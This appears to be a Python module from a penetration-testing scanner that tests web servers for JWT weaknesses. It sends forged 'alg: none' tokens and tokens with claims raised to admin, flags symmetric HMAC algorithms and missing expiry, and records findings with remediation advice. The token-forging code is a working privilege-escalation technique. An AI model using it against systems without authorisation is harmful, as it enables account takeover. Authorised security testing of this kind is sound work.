"""JWT attack testing — none algorithm, key confusion, claim tampering."""

from __future__ import annotations

import base64
import json
import re
from typing import Any

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule


def _decode_jwt_part(part: str) -> dict | None:
    padding = 4 - len(part) % 4
    part += "=" * padding
    try:
        return json.loads(base64.urlsafe_b64decode(part))
    except Exception:
        return None


def _encode_jwt_part(data: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()


class JWTAttackModule(BaseTestModule):
    name = "jwt_attacks"
    category = "auth"
    owasp_categories = ["A07"]
    description = "JWT vulnerability testing"

    def get_techniques(self) -> list[str]:
        return ["none_algorithm", "key_confusion", "claim_tampering", "expired_token", "missing_validation"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings = []
        base_url = session.target.base_url

        # Find JWT tokens in responses
        try:
            resp = await http.get(base_url, module="jwt_attacks")
        except Exception:
            return findings

        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        tokens = set()

        # Check response body
        tokens.update(re.findall(jwt_pattern, resp.text))

        # Check response headers
        for header_val in resp.headers.values():
            tokens.update(re.findall(jwt_pattern, header_val))

        # Check credentials for tokens
        creds = session.credentials.get("default")
        if creds and creds.token:
            token_val = creds.token.get()
            if re.match(jwt_pattern, token_val):
                tokens.add(token_val)

        for token in tokens:
            parts = token.split(".")
            if len(parts) != 3:
                continue

            header = _decode_jwt_part(parts[0])
            payload = _decode_jwt_part(parts[1])

            if not header or not payload:
                continue

            # Check algorithm
            alg = header.get("alg", "")

            # Test 1: None algorithm attack
            none_header = _encode_jwt_part({"alg": "none", "typ": "JWT"})
            none_token = f"{none_header}.{parts[1]}."

            try:
                none_resp = await http.get(
                    base_url,
                    headers={"Authorization": f"Bearer {none_token}"},
                    module="jwt_attacks",
                    inject_creds=False,
                )
                if none_resp.status_code in (200, 201, 204):
                    findings.append(Finding(
                        title="JWT None Algorithm Accepted",
                        severity=Severity.CRITICAL,
                        category="auth",
                        owasp_category="A07",
                        description="The server accepts JWTs with 'alg: none', allowing forged tokens without a signature.",
                        remediation="Explicitly reject 'none' algorithm. Whitelist allowed algorithms (e.g., RS256 only).",
                        endpoint=base_url,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                        cvss_score=9.1,
                        cwe_id="CWE-347",
                        evidence=[Evidence(
                            request_method="GET",
                            request_url=base_url,
                            request_headers={"Authorization": f"Bearer {none_token[:50]}..."},
                            response_status=none_resp.status_code,
                            description="Server returned 200 with 'alg: none' token",
                        )],
                    ))
            except Exception:
                pass

            # Test 2: Claim tampering (change role/admin claims)
            if payload:
                tampered_payload = dict(payload)
                tampered = False
                for claim in ["role", "admin", "is_admin", "permissions", "scope", "groups"]:
                    if claim in tampered_payload:
                        if claim in ("admin", "is_admin"):
                            tampered_payload[claim] = True
                        elif claim == "role":
                            tampered_payload[claim] = "admin"
                        elif claim == "scope":
                            tampered_payload[claim] = "admin:all"
                        tampered = True

                if tampered:
                    tampered_part = _encode_jwt_part(tampered_payload)
                    tampered_token = f"{parts[0]}.{tampered_part}.{parts[2]}"

                    try:
                        tampered_resp = await http.get(
                            base_url,
                            headers={"Authorization": f"Bearer {tampered_token}"},
                            module="jwt_attacks",
                            inject_creds=False,
                        )
                        if tampered_resp.status_code in (200, 201, 204):
                            findings.append(Finding(
                                title="JWT Claim Tampering Not Validated",
                                severity=Severity.HIGH,
                                category="auth",
                                owasp_category="A07",
                                description="The server accepted a JWT with modified claims (e.g., elevated role) "
                                            "without rejecting the invalid signature.",
                                remediation="Always validate JWT signatures server-side. Never trust claims without verification.",
                                endpoint=base_url,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                                cvss_score=8.8,
                                cwe_id="CWE-345",
                            ))
                    except Exception:
                        pass

            # Test 3: Weak algorithm detection
            if alg in ("HS256", "HS384", "HS512"):
                findings.append(Finding(
                    title=f"JWT Uses Symmetric Algorithm ({alg})",
                    severity=Severity.INFO,
                    category="auth",
                    owasp_category="A07",
                    description=f"JWT uses symmetric algorithm {alg}. If the secret is weak, "
                                "tokens can be forged via brute force. Also vulnerable to key confusion if RS->HS downgrade is possible.",
                    remediation="Use asymmetric algorithms (RS256, ES256). If using HMAC, ensure a strong (256-bit+) random secret.",
                    endpoint=base_url,
                    cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    cvss_score=7.4,
                    cwe_id="CWE-327",
                ))

            # Test 4: Check for missing expiration
            if "exp" not in payload:
                findings.append(Finding(
                    title="JWT Missing Expiration Claim",
                    severity=Severity.MEDIUM,
                    category="auth",
                    owasp_category="A07",
                    description="JWT token has no 'exp' (expiration) claim. Tokens never expire.",
                    remediation="Always include 'exp' claim with a reasonable TTL. Validate expiration server-side.",
                    endpoint=base_url,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
                    cvss_score=5.4,
                    cwe_id="CWE-613",
                ))

        return findings
